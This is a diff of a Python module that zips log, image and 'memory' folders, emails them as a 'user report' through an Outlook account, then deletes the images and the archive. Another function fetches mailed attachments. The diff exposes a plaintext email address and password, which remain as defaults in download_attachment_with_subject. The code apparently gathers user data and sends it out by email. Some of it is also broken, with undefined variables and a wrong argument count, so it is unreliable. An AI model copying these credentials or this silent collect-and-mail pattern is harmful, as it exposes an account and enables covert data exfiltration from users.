@@ -8,11 +8,14 @@ import email
 import os
 import shutil
 import logging
+from consts import *
 
 
-def send_email(sender_email="alinmagdad@outlook.com", sender_password="yogev&0mri",
-               recipient_email="alinmagdad@outlook.com", cc_emails=None, subject="", message="",
+def send_email(sender_email=SENDER_MAIL, sender_password=SENDER_PASS,
+               recipient_email=SENDER_MAIL, cc_emails=[], subject="", message="",
                attachment_path=None):
+    if sender_email != SENDER_MAIL:
+        cc_emails.append(SENDER_MAIL)
     smtp_server = "smtp.office365.com"
     smtp_port = 587
 
@@ -51,25 +54,107 @@ def send_email(sender_email="alinmagdad@outlook.com", sender_password="yogev&0mr
         server.sendmail(sender_email, recipient_email, email.as_string())
         logging.info("Email sent successfully.")
     except Exception as e:
-        logging.error("Failed to send email. "+str(e))
+        logging.error("Failed to send email. " + str(e))
     finally:
         # Close the connection
         server.quit()
 
 
-def sender():
+def compress_directories_files(source_paths, files_to_add, output_filename):
+    """
+    :param source_paths:
+    :param files_to_add:
+    :param output_filename:
+    :return:
+    """
+    # Create a zip archive
+    with tempfile.TemporaryDirectory() as temp_dir:
+        for path in source_paths:
+            destination_dir = os.path.join(temp_dir, os.path.basename(path))
+            shutil.copytree(path, destination_dir)
+
+        # Copy individual files to temporary directory
+        for file_path in files_to_add:
+            file_name = os.path.basename(file_path)
+            shutil.copy(file_path, os.path.join(temp_dir, file_name))
+
+        shutil.make_archive(output_filename, 'zip', temp_dir)
+
+def clear_folder(folder_path):
+    """
+
+    :param folder_path:
+    :return:
+    """
+    # Get the list of files in the folder
+    items = os.listdir(folder_path)
+    # Iterate over the files and remove them
+    for item in items:
+        item_path = os.path.join(folder_path, item)
+        if os.path.isfile(item_path):
+            os.remove(item_path)
+            print(f"Removed file: {item_path}")
+        elif os.path.isdir(item_path):
+            shutil.rmtree(item_path)
+            print(f"Removed folder: {item_path}")
+
+
+def check_empty(directories_files):
+    """
+    check if loggers are empty
+    :param directories_files:
+    :return:
+    """
+    for path in directories_files:
+        if os.path.isfile(path):
+            if os.path.getsize(path) != 0:
+                return False
+        elif os.path.isdir(path):
+            if len(os.listdir(path)) != 0:
+                return False
+        else:
+            return False
+    return True
+
+
+def send_logs():
+    """
+
+    :param atachements:
+    :return:
+    """
+
+    compress_dirs= [MEMORY_DIR_PATH, LOG_PATH, IMG_PATH]
+    if check_empty(compress_dirs):
+        return
+
+    compress_directories_files(compress_dirs, "report")
+    clear_folder(IMG_PATH)
+    # Read the contents of the log file
+    log_file_path = 'path/to/logfile.txt'
+    with open(log_file_path, 'r') as file:
+        log_content = file.read()
+
+    # Format the log content
+    formatted_log = f"Log Content:\n\n{log_content}"
+
+    empty_logging_file("logs.log")
+
     # Provide your email credentials and other details
-    sender_email = "alinmagdad@outlook.com"
-    sender_password = "yogev&0mri"
-    recipient_email = "shahar.mozes@gmail.com"
-    subject = "Test Email with python"
-    message = "hi,\n this mail was sent via python. I plan to use this method to send user reports"
-    attachment_path = "/Users/yogev/Library/CloudStorage/OneDrive-Personal/talp_files/yr 2/sem d/logic 2/sol8.pdf"
+    #recipient_email = "alinmagdad1@outlook.com"
+    subject = "user report"
+    message = formatted_log
+    attachment_path = RELATIVE_PATH+"report.zip"
 
     # Send the email
     send_email(sender_email=sender_email, sender_password=sender_password, recipient_email=recipient_email,
                subject=subject, message=message, attachment_path=attachment_path)
 
+    try:
+        os.remove(attachment_path)
+        print(f"File '{attachment_path}' deleted successfully.")
+    except OSError as e:
+        print(f"Error occurred while deleting file '{attachment_path}': {e}")
 
 # recieve data file via mail
 def download_attachment_with_subject(username="alinmagdad@outlook.com", password="yogev&0mri", subject=None,
@@ -119,7 +204,7 @@ def download_attachment_with_subject(username="alinmagdad@outlook.com", password
                 save_path = os.path.join(save_folder, filename)
                 with open(save_path, "wb") as f:
                     f.write(part.get_payload(decode=True))
-                    logging.info("Attachment downloaded: "+save_path)
+                    logging.info("Attachment downloaded: " + save_path)
                 break
 
     # Logout and close the connection
